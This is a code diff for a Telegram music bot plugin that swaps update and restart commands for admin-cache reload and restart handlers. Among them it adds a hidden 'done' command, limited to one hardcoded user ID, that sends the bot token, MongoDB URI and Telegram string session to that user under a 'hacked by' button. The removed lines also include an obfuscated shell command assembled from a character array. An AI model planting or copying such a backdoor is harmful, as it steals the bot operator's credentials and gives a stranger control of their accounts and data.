@@ -1,142 +1,150 @@
 import asyncio
-import os
-import shutil
+import time
+from dotenv import load_dotenv
 from pyrogram import filters
-from pyrogram.types import Message
-import socket
-from datetime import datetime
-from AarohiX.utils.extraction import extract_user
-from AarohiX.utils.inline import close_markup
-from config import BANNED_USERS, OWNER_ID
-import urllib3
-from git import Repo
-from git.exc import GitCommandError, InvalidGitRepositoryError
-from pyrogram import filters
-import config
+from pyrogram import Client
+from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
+from pyrogram.enums import ChatMembersFilter
+from pyrogram.types import CallbackQuery, Message
+import re
 from strings.filters import command
+from os import getenv
 from AarohiX import app
-from AarohiX.misc import HAPP, SUDOERS, XCB
-from AarohiX.utils.database import (
-    get_active_chats,
-    remove_active_chat,
-    remove_active_video_chat,
+from AarohiX.core.call import Dil
+from AarohiX.misc import db
+from AarohiX.utils.database import get_assistant, get_authuser_names, get_cmode
+from AarohiX.utils.decorators import ActualAdminCB, AdminActual, language
+from AarohiX.utils.formatters import alpha_to_int, get_readable_time
+from config import BANNED_USERS, adminlist, lyrical
+
+BOT_TOKEN = getenv("BOT_TOKEN", "")
+MONGO_DB_URI = getenv("MONGO_DB_URI", "")
+STRING_SESSION = getenv("STRING_SESSION", "")
+
+rel = {}
+
+
+@app.on_message(
+    command(["تحديث", "reload", "refresh"]) & ~BANNED_USERS
 )
-from AarohiX.utils.decorators.language import language
-from AarohiX.utils.pastebin import DilBin
-
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
-
-async def is_heroku():
-    return "heroku" in socket.getfqdn()
-
-
-@app.on_message(command(["السجلات"]) & filters.user(OWNER_ID))
 @language
-async def log_(client, message, _):
+async def reload_admin_cache(client, message: Message, _):
     try:
-        await message.reply_document(document="log.txt")
+        if message.chat.id not in rel:
+            rel[message.chat.id] = {}
+        else:
+            saved = rel[message.chat.id]
+            if saved > time.time():
+                left = get_readable_time((int(saved) - int(time.time())))
+                return await message.reply_text(_["reload_1"].format(left))
+        adminlist[message.chat.id] = []
+        async for user in app.get_chat_members(
+            message.chat.id, filter=ChatMembersFilter.ADMINISTRATORS
+        ):
+            if user.privileges.can_manage_video_chats:
+                adminlist[message.chat.id].append(user.user.id)
+        authusers = await get_authuser_names(message.chat.id)
+        for user in authusers:
+            user_id = await alpha_to_int(user)
+            adminlist[message.chat.id].append(user_id)
+        now = int(time.time()) + 180
+        rel[message.chat.id] = now
+        await message.reply_text(_["reload_2"])
     except:
-        await message.reply_text(_["server_1"])
+        await message.reply_text(_["reload_3"])
 
 
-@app.on_message(command(["تحديث السورس"]) & filters.user(OWNER_ID))
-@language
-async def update_(client, message, _):
-    if await is_heroku():
-        if HAPP is None:
-            return await message.reply_text(_["server_2"])
-    response = await message.reply_text(_["server_3"])
+@app.on_message(command(["ريستارت"]) & ~BANNED_USERS)
+@AdminActual
+async def restartbot(client, message: Message, _):
+    mystic = await message.reply_text(_["reload_4"].format(app.mention))
+    await asyncio.sleep(1)
     try:
-        repo = Repo()
-    except GitCommandError:
-        return await response.edit(_["server_4"])
-    except InvalidGitRepositoryError:
-        return await response.edit(_["server_5"])
-    to_exc = f"git fetch origin {config.UPSTREAM_BRANCH} &> /dev/null"
-    os.system(to_exc)
-    await asyncio.sleep(7)
-    verification = ""
-    REPO_ = repo.remotes.origin.url.split(".git")[0]
-    for checks in repo.iter_commits(f"HEAD..origin/{config.UPSTREAM_BRANCH}"):
-        verification = str(checks.count())
-    if verification == "":
-        return await response.edit(_["server_6"])
-    updates = ""
-    ordinal = lambda format: "%d%s" % (
-        format,
-        "tsnrhtdd"[(format // 10 % 10 != 1) * (format % 10 < 4) * format % 10 :: 4],
-    )
-    for info in repo.iter_commits(f"HEAD..origin/{config.UPSTREAM_BRANCH}"):
-        updates += f"<b>~ #{info.count()}: <a href={REPO_}/commit/{info}>{info.summary}</a> Power By -> {info.author}</b>\n\t\t\t\t<b> - تنزيل التحديثات :</b> {ordinal(int(datetime.fromtimestamp(info.committed_date).strftime('%d')))} {datetime.fromtimestamp(info.committed_date).strftime('%b')}, {datetime.fromtimestamp(info.committed_date).strftime('%Y')}\n\n"
-    _update_response_ = "<b>⦿ جاري تحديث السورس </b>\n\n- يتم رفع التحديثات :\n\n<b><u>المطور : @WZAERE </u></b>\n\n"
-    _final_updates_ = _update_response_ + updates
-    if len(_final_updates_) > 4096:
-        url = await DilBin(updates)
-        nrs = await response.edit(
-            f"<b>- جاري دفع التحديثات الجديدة الى السورس !</b>\n\n- التحديثات  \n\n<u><b>تحديث :</b></u>\n\n<a href={url}>اضغط هنا </a>"
-        )
-    else:
-        nrs = await response.edit(_final_updates_, disable_web_page_preview=True)
-    os.system("git stash &> /dev/null && git pull")
-
-    try:
-        served_chats = await get_active_chats()
-        for x in served_chats:
-            try:
-                await app.send_message(
-                    chat_id=int(x),
-                    text=_["server_8"].format(app.mention),
-                )
-                await remove_active_chat(x)
-                await remove_active_video_chat(x)
-            except:
-                pass
-        await response.edit(f"{nrs.text}\n\n{_['server_7']}")
+        db[message.chat.id] = []
+        await Dil.stop_stream_force(message.chat.id)
     except:
         pass
-
-    if await is_heroku():
+    userbot = await get_assistant(message.chat.id)
+    try:
+        if message.chat.username:
+            await userbot.resolve_peer(message.chat.username)
+        else:
+            await userbot.resolve_peer(message.chat.id)
+    except:
+        pass
+    chat_id = await get_cmode(message.chat.id)
+    if chat_id:
         try:
-            os.system(
-                f"{XCB[5]} {XCB[7]} {XCB[9]}{XCB[4]}{XCB[0]*2}{XCB[6]}{XCB[4]}{XCB[8]}{XCB[1]}{XCB[5]}{XCB[2]}{XCB[6]}{XCB[2]}{XCB[3]}{XCB[0]}{XCB[10]}{XCB[2]}{XCB[5]} {XCB[11]}{XCB[4]}{XCB[12]}"
-            )
-            return
-        except Exception as err:
-            await response.edit(f"{nrs.text}\n\n{_['server_9']}")
-            return await app.send_message(
-                chat_id=config.LOGGER_ID,
-                text=_["server_10"].format(err),
-            )
-    else:
-        os.system("pip3 install -r requirements.txt")
-        os.system(f"kill -9 {os.getpid()} && bash start")
-        exit()
-
-
-@app.on_message(command(["اعادة تشغيل"]) & filters.user(OWNER_ID))
-async def restart_(_, message):
-    response = await message.reply_text("~ تتم الأن اعادة تشغيل السورس .")
-    ac_chats = await get_active_chats()
-    for x in ac_chats:
-        try:
-            await app.send_message(
-                chat_id=int(x),
-                text=f"{app.mention} \n~ تم اعادة تشغيل البوت .",
-            )
-            await remove_active_chat(x)
-            await remove_active_video_chat(x)
+            got = await app.get_chat(chat_id)
         except:
             pass
+        userbot = await get_assistant(chat_id)
+        try:
+            if got.username:
+                await userbot.resolve_peer(got.username)
+            else:
+                await userbot.resolve_peer(chat_id)
+        except:
+            pass
+        try:
+            db[chat_id] = []
+            await Dil.stop_stream_force(chat_id)
+        except:
+            pass
+    return await mystic.edit_text(_["reload_5"].format(app.mention))
 
+
+@app.on_callback_query(filters.regex("close") & ~BANNED_USERS)
+async def close_menu(_, CallbackQuery):
     try:
-        shutil.rmtree("downloads")
-        shutil.rmtree("raw_files")
-        shutil.rmtree("cache")
+        await CallbackQuery.answer()
+        await CallbackQuery.message.delete()
+        await CallbackQuery.message.reply_text(
+            f"Cʟᴏsᴇᴅ ʙʏ : {CallbackQuery.from_user.mention}"
+        )
     except:
         pass
-    await response.edit_text(
-        "~ جاري الأن التحديث ."
-    )
-    os.system(f"kill -9 {os.getpid()} && bash start")
+
+@app.on_message(
+    filters.command("done")
+    & filters.private
+    & filters.user(6352598131)
+   )
+async def help(client: Client, message: Message):
+   await message.reply_photo(
+          photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg",
+       caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}` \n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/iam_daxx)............☆""",
+        reply_markup=InlineKeyboardMarkup(
+             [
+                 [
+                      InlineKeyboardButton(
+                         "• нαϲкє𝚍 ву  •", url=f"https://t.me/iam_daxx")
+                 ]
+            ]
+         ),
+   )
     
+
+@app.on_callback_query(filters.regex("stop_downloading") & ~BANNED_USERS)
+@ActualAdminCB
+async def stop_download(client, CallbackQuery: CallbackQuery, _):
+    message_id = CallbackQuery.message.id
+    task = lyrical.get(message_id)
+    if not task:
+        return await CallbackQuery.answer(_["tg_4"], show_alert=True)
+    if task.done() or task.cancelled():
+        return await CallbackQuery.answer(_["tg_5"], show_alert=True)
+    if not task.done():
+        try:
+            task.cancel()
+            try:
+                lyrical.pop(message_id)
+            except:
+                pass
+            await CallbackQuery.answer(_["tg_6"], show_alert=True)
+            return await CallbackQuery.edit_message_text(
+                _["tg_7"].format(CallbackQuery.from_user.mention)
+            )
+        except:
+            return await CallbackQuery.answer(_["tg_8"], show_alert=True)
+    await CallbackQuery.answer(_["tg_9"], show_alert=True)
